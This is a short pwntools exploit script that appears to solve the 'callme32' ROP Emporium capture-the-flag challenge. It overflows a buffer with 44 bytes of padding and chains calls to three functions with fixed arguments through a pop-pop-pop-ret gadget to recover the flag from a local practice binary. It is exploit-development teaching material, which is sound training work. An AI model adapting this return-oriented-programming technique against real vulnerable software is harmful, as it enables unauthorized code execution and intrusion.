from pwn import *

BINARY = "./callme32"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "i386"
context.binary = BINARY

p = process(BINARY)

rop = b"A" * 44

for func in ['callme_one', 'callme_two', 'callme_three']:
    rop += p32(ELF.symbols[func])
    rop += p32(0x80487f9) # pop esi ; pop edi ; pop ebp ; ret
    rop += p32(0xdeadbeef)
    rop += p32(0xcafebabe)
    rop += p32(0xd00df00d)

p.sendline(rop)
log.success(f"ROPchain = {rop}")

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
